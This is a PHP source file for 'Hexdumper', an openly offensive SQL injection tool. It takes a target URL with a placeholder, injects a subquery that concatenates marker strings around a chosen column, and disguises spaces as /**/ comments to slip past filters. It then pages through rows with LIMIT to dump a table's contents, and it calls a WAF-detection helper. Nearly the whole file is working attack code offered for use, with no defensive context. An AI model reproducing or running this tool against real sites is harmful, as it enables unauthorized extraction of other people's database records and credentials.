<?php

/*

	Hexdumper is a script to extract data from MySQL tables.
	
    Copyright (C) 2010 Hexon

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.


*/

$Hexdumper_Version = "v1.0.1";

?>

<title>
Hexdumper
</title>

<?php

include("Con_Url_WD.php");

include("WAF_Detector.php");

function dump()
{
$whitespace = "/**/";
$url = $_POST['url'];
$hexon ="hexon";
$col = $_POST['column'];
$table = $_POST['table'];
$start = 0;
$loop = 1000;
echo htmlspecialchars($col,ENT_QUOTES) , "<br \>";
isset($end);
for($loop=$start;$end<=$loop;$loop++)
{
$dumpstr = "(SELECT distinct concat(concat(CHAR(104,51,120,58)),$col,CHAR(58,104,51,120))"." from ".$table." limit ".$loop.",1)";
$realdump = str_replace(" ",$whitespace,$dumpstr);
$dump = str_replace($hexon,$realdump,$url);

if(preg_match("/h3x:(.*?):h3x/",geturl($dump),$datadump))
{
echo "<b>",htmlspecialchars($datadump[1],ENT_QUOTES),"</b>" , "<br \>";
}
elseif(wafdetect($dump))
{}
else
{
echo "<br \>"; 
die("<b>Data Dump Done</b>");
}

}
}

echo 
'
<title>
Hexdumpfile -- Manual Into DumpFile
</title>
<head>
<body background="Hex1.jpg"></body>

<style type="text/css">
<!--body {background-color: black}-->
<!-- body {color : gold} -->
body {color : white}
h2 {color : white}
</style>
';

if(isset($_POST['submit']))
{
if(isset($_POST['url']))
{
if(isset($_POST['table']))
{
if(isset($_POST['column']))
{
$hexon ="hexon";
$url = $_POST['url'];
$col = $_POST['column'];

if($match = preg_match("/hexon/i",$url,$foundhexon))
{
dump();
}
else
{
die("hexon str is not found");
}
}
}
}
}

?>